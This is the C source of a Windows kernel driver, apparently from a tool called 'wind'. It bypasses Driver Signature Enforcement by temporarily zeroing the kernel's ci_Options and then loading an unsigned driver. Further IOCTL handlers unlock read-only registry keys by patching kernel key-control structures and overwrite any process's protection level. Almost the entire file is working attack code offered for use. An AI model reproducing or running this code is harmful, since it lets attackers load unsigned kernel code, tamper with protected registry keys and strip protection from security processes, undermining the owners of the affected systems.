#include <ntifs.h>
#include <ntimage.h>
#define _WIND_DRIVER
#include "defs.h"
#include "wind.h"
#include "regint.h"

static wind_config_t cfg = {(void*)(-(LONG)sizeof(cfg))};
static KMUTEX ioctl_mutex;

// What follows is the meat of the whole DSE bypass.
//
// We temporarily flip the ci_Options to not validate, load driver, flip
// ci_options back.
//
static void ci_restore()
{
	DBG("current ci_Options=%08x\n", *((ULONG*)cfg.ci_opt));
	cfg.ci_opt[0] = cfg.ci_guess;
	DBG("now restored ci_Options=%08x\n", *((ULONG*)cfg.ci_opt));
}

static NTSTATUS driver_sideload(PUNICODE_STRING svc)
{
	NTSTATUS status;

	// Clear ci_Options. Daaaaanger zone.
	cfg.ci_opt[0] = 0;

	// Now go fetch.
	status = ZwLoadDriver(svc);

	// Restore ci_Options.
	ci_restore();

	return status;
}

// The rest is just boring driver boilerplate...
static VOID NTAPI dev_unload(IN PDRIVER_OBJECT self)
{
	DBG("unloading!\n");
	IoDeleteDevice(self->DeviceObject);
}

static NTSTATUS NTAPI dev_open(IN PDEVICE_OBJECT dev, IN PIRP irp)
{
	irp->IoStatus.Status = STATUS_SUCCESS;
	irp->IoStatus.Information = 0;
	IoCompleteRequest(irp, IO_NO_INCREMENT);
	return STATUS_SUCCESS;
}

static int notify_unlock(int lock, CM_KEY_BODY *tkb, CM_KEY_BODY *kb)
{
	int ret = 0;
	CM_NOTIFY_BLOCK *nb;
	DBG("unlock %d %p %p\n",lock,tkb,kb);

	if (!tkb)
		return 0;
	if (tkb->KeyControlBlock != kb->KeyControlBlock)
		return 0;
	nb = tkb->NotifyBlock;
	while (nb) {
		union {
			struct {
			ULONG low:8;
			ULONG high:8;
			ULONG rest:14;
			};
			ULONG n:30;
		} f;
		if (nb->KeyControlBlock != kb->KeyControlBlock)
			goto skipentry;

		f.n = nb->Filter;
		DBG("process NB @ %p Filter=%x high=%x low=%x\n",
				nb, nb->Filter, f.high, f.low);
		if (!lock && f.low && !f.high) {
			f.high = f.low;
			f.low = 0;
			DBG("unlock: changing filter from %x to %x", nb->Filter, f.n);
			nb->Filter = f.n;
			ret++;
		}
		if (lock && f.high && !f.low) {
			f.low = f.high;
			f.high = 0;
			DBG("re-lock: changing filter from %x to %x", nb->Filter, f.n);
			nb->Filter = f.n;
			ret++;
		}
skipentry:
		if (!nb->HiveList.Flink)
			break;
		nb = CONTAINING_RECORD(nb->HiveList.Flink,
				CM_NOTIFY_BLOCK, HiveList);
	}
	return ret;
}

// Unlock/Lock registry key. This is slightly racey, don't use with busy keys.
static NTSTATUS unlock_key(PUNICODE_STRING name, int lock)
{
#define KLOCK_FLAGS (CM_KCB_NO_DELAY_CLOSE|CM_KCB_READ_ONLY_KEY)
#define KUNLOCK_MARKER (1<<15)
#define NSPAM 6
	HANDLE 		harr[NSPAM];
	CM_KEY_BODY 	*kbs[NSPAM], *kb;
	NTSTATUS 	st;
	CM_KEY_CONTROL_BLOCK *cb;
	LIST_ENTRY 	*kl;
	void 		**scan;
	int 		i;
	struct {
		LIST_ENTRY 	KeyBodyListHead;
		CM_KEY_BODY  	*KeyBodyArray[4];
	} *cbptr = NULL;

	// Spam handles to ensure we'll appear in cbptr->KeyBodyListHead.
	for (i = 0; i < NSPAM; i++) {
		OBJECT_ATTRIBUTES attr = {
			.Length = sizeof(attr),
			.Attributes = OBJ_KERNEL_HANDLE|OBJ_CASE_INSENSITIVE,
			.ObjectName = name,
		};
		st = ZwOpenKey(&harr[i], KEY_READ, &attr);
		if (!NT_SUCCESS(st))
			goto out_unspam_zwclose;
	}
	for (i = 0; i < NSPAM; i++) {
		st = ObReferenceObjectByHandle(harr[i], KEY_WRITE,
				*CmKeyObjectType, 0, (void*)&kbs[i], NULL);
		if (!NT_SUCCESS(st))
			goto out_unspam_deref;
	}

	kb = kbs[NSPAM-1];
	cb = kb->KeyControlBlock;
	st = STATUS_KEY_DELETED;
	if (!cb || cb->Delete)
		goto out_unspam;

	scan = (void*)cb;
	st = STATUS_INTERNAL_ERROR;
	DBG("kb=%p cb=%p, scanning...\n", kb, cb);
	// Find ourselves in the CM_KEY_CONTROL_BLOCK structure.
	for (i = 0; i < 512; i++) {
		DBG("scan near %p = %p %p\n", &scan[i], scan[i], &kb->KeyBodyList)
		if (scan[i] == &kb->KeyBodyList) {
			cbptr = (void*)(scan+i-1);
			break;
		}
	}
	if (!cbptr) {
		DBG("cbptr not found\n");
		goto out_unspam;
	}

	DBG("cbptr @ %p, offset %p\n", cbptr, ((ULONG_PTR)(((void*)cbptr)-((void*)cb))));

	// Now process array area.
	for (i = 0; i < 4; i++)
		if (notify_unlock(lock, cbptr->KeyBodyArray[i], kb))
			st = STATUS_SUCCESS;

	// And list area too.
	kl = cbptr->KeyBodyListHead.Flink;
	DBG("kl=%p\n");
	while (kl && (kl != &cbptr->KeyBodyListHead)) {
		CM_KEY_BODY *tkb = CONTAINING_RECORD(kl, CM_KEY_BODY, KeyBodyList);
		if (notify_unlock(lock, tkb, kb))
			st = STATUS_SUCCESS;
		kl = kl->Flink;
	}

	DBG("lock=%d, kb=%p, cb=%p, t=%x refc=%u flags=%02x nb=%p\n",
	lock, kb, cb, kb->Type, cb->RefCount, cb->ExtFlags, kb->NotifyBlock);

	// Type 2 keys: Hard lock flag via NtLockRegistryKey public (!) syscall.
	if (lock) {
		if (!(cb->ExtFlags & KUNLOCK_MARKER))
			goto out_unspam;
		cb->ExtFlags &= ~KUNLOCK_MARKER;
		cb->ExtFlags |= KLOCK_FLAGS;
		st = STATUS_SUCCESS;
	} else {
		if (cb->ExtFlags & KUNLOCK_MARKER)
			goto out_unspam;
		if ((cb->ExtFlags & KLOCK_FLAGS) != KLOCK_FLAGS)
			goto out_unspam;
		cb->ExtFlags &= ~KLOCK_FLAGS;
		cb->ExtFlags |= KUNLOCK_MARKER;
		st = STATUS_SUCCESS;
	}
out_unspam:;
	i = NSPAM;
out_unspam_deref:
	for (int j = 0; j < i; j++)
		ObDereferenceObject(kbs[j]);
	i = NSPAM;
out_unspam_zwclose:
	for (int j = 0; j < i; j++)
		ZwClose(harr[j]);
	return st;
}

static NTSTATUS change_prot(wind_prot_t *req)
{
	int getonly;
	void *proc;
	NTSTATUS status;
	if ((getonly = (req->pid < 0)))
		req->pid = -req->pid;
	status = PsLookupProcessByProcessId((HANDLE)(req->pid), (PEPROCESS*)&proc);
	if (!NT_SUCCESS(status))
		return status;
	if (cfg.protbit < 0) {
		WIND_PS_PROTECTION save, *prot = proc + cfg.protofs - 2;
		memcpy(&save, prot, sizeof(save));
		if (!getonly)
			memcpy(prot, &req->prot, sizeof(req->prot));
		memcpy(&req->prot, &save, sizeof(save));
	} else {
		ULONG prev, *prot = proc + cfg.protofs;
		prev = *prot;
		if (!getonly)
			*prot = (prev & (~(1<<cfg.protbit)))
				| ((!!req->prot.Level) << cfg.protbit);
		memset(&req->prot, 0, sizeof(req->prot));
		req->prot.Level = (prev>>cfg.protbit)&1;
	}
	ObDereferenceObject(proc);
	return status;
}

static NTSTATUS NTAPI dev_control(IN PDEVICE_OBJECT dev, IN PIRP irp)
{
	PIO_STACK_LOCATION io_stack;
	ULONG code;
	NTSTATUS status = STATUS_INVALID_PARAMETER;
	UNICODE_STRING us;
	void *buf;
	int len;

	KeWaitForMutexObject(&ioctl_mutex, UserRequest, KernelMode, FALSE, NULL);

	io_stack = IoGetCurrentIrpStackLocation(irp);
	if (!io_stack)
		goto out;

	buf = irp->AssociatedIrp.SystemBuffer;
	len = io_stack->Parameters.DeviceIoControl.InputBufferLength;
	code = io_stack->Parameters.DeviceIoControl.IoControlCode;

	irp->IoStatus.Information = 0;

	if (!SeSinglePrivilegeCheck(LUID_SeLoadDriverPrivilege, irp->RequestorMode)) {
		status = STATUS_PRIVILEGE_NOT_HELD;
		goto out;
	}

	status = STATUS_INVALID_BUFFER_SIZE;
	DBG("code=%08x\n",(unsigned)code);

	// 0x10 marks string argument.
	if (code & (0x10 << 2)) {
		// must be at least 2 long, must be even, must terminate with 0
		if ((len < 2) || (len&1) || (*((WCHAR*)(buf+len-2))!=0))
			goto out;

		us.Buffer = (void*)buf;
		us.Length = len-2;
		us.MaximumLength = len;
	}


switch (code) {
	case WIND_IOCTL_INSMOD:
		status = driver_sideload(&us);
		break;
	case WIND_IOCTL_REGLOCK:
		status = unlock_key(&us, 1);
		break;
	case WIND_IOCTL_REGUNLOCK:
		status = unlock_key(&us, 0);
		break;
	case WIND_IOCTL_PROT:
		if (len != sizeof(wind_prot_t))
			goto out;
		status = change_prot(buf);
		irp->IoStatus.Information = len;
		break;
}
out:;
	KeReleaseMutex(&ioctl_mutex, 0);
	irp->IoStatus.Status = status;
	IoCompleteRequest(irp, IO_NO_INCREMENT);
	return status;
}

NTSTATUS NTAPI ENTRY(driver_entry)(IN PDRIVER_OBJECT self, IN PUNICODE_STRING reg)
{
	PDEVICE_OBJECT dev;
	NTSTATUS status;
	RTL_QUERY_REGISTRY_TABLE tab[2] = {{
		.Flags = RTL_QUERY_REGISTRY_DIRECT
			|RTL_QUERY_REGISTRY_TYPECHECK
			|RTL_QUERY_REGISTRY_REQUIRED
#ifdef NDEBUG
			|RTL_QUERY_REGISTRY_DELETE
#endif
			,
		.Name = L"cfg",
		.EntryContext = &cfg,
		.DefaultType = (REG_BINARY<<RTL_QUERY_REGISTRY_TYPECHECK_SHIFT)
			|REG_NONE
	},{}};

	status = RtlQueryRegistryValues(0, reg->Buffer, tab, NULL, NULL);
	if (!NT_SUCCESS(status)) {
		DBG("registry read failed=%x\n",(unsigned)status);
		return status;
	}
	DBG("initializing driver with:\n"
		" .ci_opt = %p\n"
		" .ci_orig = %p\n"
		" .ci_guess = %02x\n"
		" .protofs = %x\n"
		" .protbit = %d\n", cfg.ci_opt, cfg.ci_orig, cfg.ci_guess,
		cfg.protofs, cfg.protbit);

	self->DriverUnload = dev_unload;
	self->MajorFunction[IRP_MJ_CREATE] = dev_open;
	self->MajorFunction[IRP_MJ_DEVICE_CONTROL] = dev_control;

	status = IoCreateDevice(self, 0, &RTL_STRING(L"\\Device\\" WIND_DEVNAME),
			FILE_DEVICE_UNKNOWN, 0, 0, &dev);

	if (!NT_SUCCESS(status)) {
		DBG("failed to create device=%08x\n",(unsigned)status);
		return status;
	}

	if (cfg.ci_orig)
		cfg.ci_guess = *cfg.ci_orig;
	ci_restore();

	dev->Flags |= METHOD_BUFFERED;
	dev->Flags &= ~DO_DEVICE_INITIALIZING;

	KeInitializeMutex(&ioctl_mutex, 0);

	DBG("loaded driver\n");
	return status;
}
